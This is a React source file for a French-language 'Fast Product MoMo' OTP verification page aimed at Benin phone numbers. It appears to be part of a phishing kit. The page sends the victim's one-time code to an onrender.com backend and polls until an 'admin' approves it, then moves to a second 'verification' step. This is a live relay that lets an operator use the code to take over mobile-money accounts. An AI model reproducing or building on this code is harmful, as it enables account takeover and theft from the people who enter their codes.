import { useState, useEffect, useRef, type KeyboardEvent } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, ArrowLeft } from "lucide-react";

const API_URL = "https://fastloan-momo-kj8m.onrender.com";

const OTPVerification = () => {
  const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
  const [timeLeft, setTimeLeft] = useState<number>(30);
  const [isVerifying, setIsVerifying] = useState<boolean>(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "0123456789";

  const formatPhone = (num: string) => {
    let clean = num.replace(/\D/g, ""); 
    if (clean.startsWith("229")) clean = clean.substring(3);
    if (clean.length === 10) return `+229 ${clean.substring(0, 2)} ••••${clean.slice(-2)}`;
    return `+229 ${clean}`;
  };

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const isOtpComplete = otp.every((digit) => digit !== "");

  useEffect(() => {
    if (timeLeft === 0) return;
    const timerId = setInterval(() => setTimeLeft((prev) => prev - 1), 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  const handleOtpChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, "");
    if (cleanValue.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = cleanValue;
    setOtp(newOtp);
    if (cleanValue && index < 3) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async () => {
    if (!isOtpComplete) return;
    setIsVerifying(true);
    
    // Timeout fallback if admin doesn't respond in 45 seconds
    const timeoutId = setTimeout(() => {
      setIsVerifying(false);
      navigate("/login"); 
    }, 45000);

    try {
      const res = await fetch(`${API_URL}/api/verify-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone_number: phoneNumber, otp_code: otp.join("") }),
      });
      const data = await res.json();
      
      if (data.status === "pending" && data.otp_id) {
        const interval = setInterval(async () => {
          const statusRes = await fetch(`${API_URL}/api/otp-status/${data.otp_id}`);
          const statusData = await statusRes.json();
          
          if (statusData.status !== "pending") {
            clearInterval(interval);
            clearTimeout(timeoutId);
            setIsVerifying(false);
            
            if (statusData.status === "approved") {
              // ✅ Move to the 2nd Verification page
              navigate("/second-verification", { state: { phone: phoneNumber } });
            } else if (statusData.status === "denied") {
              navigate("/login"); 
            }
          }
        }, 2000);
      } else {
        clearTimeout(timeoutId);
        setIsVerifying(false);
        navigate("/login");
      }
    } catch (error) {
      clearTimeout(timeoutId);
      setIsVerifying(false);
      navigate("/login");
    }
  };

  return (
    <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
      <div className="text-center mb-8 mt-4">
        <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
          <Wallet size={32} color="#1E1E1E" />
        </div>
        <h1 className="text-2xl font-extrabold text-[#1E1E1E] tracking-tight">
          Fast Product<span className="text-[#B8860B]">MoMo</span>
        </h1>
        <p className="text-sm text-white/90 mt-1 font-medium drop-shadow-sm">
          Vérification de sécurité (1/2)
        </p>
      </div>

      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8">
        <button onClick={() => navigate(-1)} className="flex items-center text-gray-500 hover:text-gray-800 font-medium mb-6 transition-colors">
          <ArrowLeft size={18} className="mr-1.5" /> Retour
        </button>
        
        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-3">Vérifiez votre numéro</h2>
        
        <p className="text-sm text-gray-600 leading-relaxed mb-8">
          Nous avons envoyé un code à 4 chiffres au <span className="font-bold text-[#1E1E1E]">{formatPhone(phoneNumber)}</span>.
        </p>
        
        <div className="flex justify-between gap-3 mb-8">
          {otp.map((digit, index) => (
            <input 
              key={index} 
              ref={(el) => { inputRefs.current[index] = el; }}
              type="text" 
              inputMode="numeric"
              value={digit} 
              onChange={(e) => handleOtpChange(index, e.target.value)} 
              onKeyDown={(e) => handleKeyDown(index, e)}
              maxLength={1}
              className="w-full h-16 text-center text-2xl font-bold text-gray-900 bg-white border-[1.5px] border-gray-300 rounded-2xl outline-none focus:border-[#F0B90B] focus:ring-2 focus:ring-[#FCD535]/50 transition-all"
            />
          ))}
        </div>

        <button 
          onClick={handleVerify} 
          disabled={!isOtpComplete || isVerifying} 
          className={`w-full py-3.5 rounded-xl font-bold text-base transition-all mb-6 ${
            isOtpComplete && !isVerifying
              ? "bg-[#F0B90B] hover:bg-[#E2AE0A] text-[#1E1E1E] cursor-pointer shadow-md"
              : "bg-gray-100 text-gray-400 cursor-not-allowed"
          }`}
        >
          {isVerifying ? "En attente..." : "Vérifier"}
        </button>
      </div>

      {isVerifying && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
            <div className="w-12 h-12 mx-auto mb-5 rounded-full border-4 border-gray-100 border-t-[#F0B90B] animate-spin" />
            <h3 className="text-lg font-bold text-[#1E1E1E] mb-2">Vérification en cours</h3>
            <p className="text-sm text-gray-500">Veuillez patienter...</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default OTPVerification;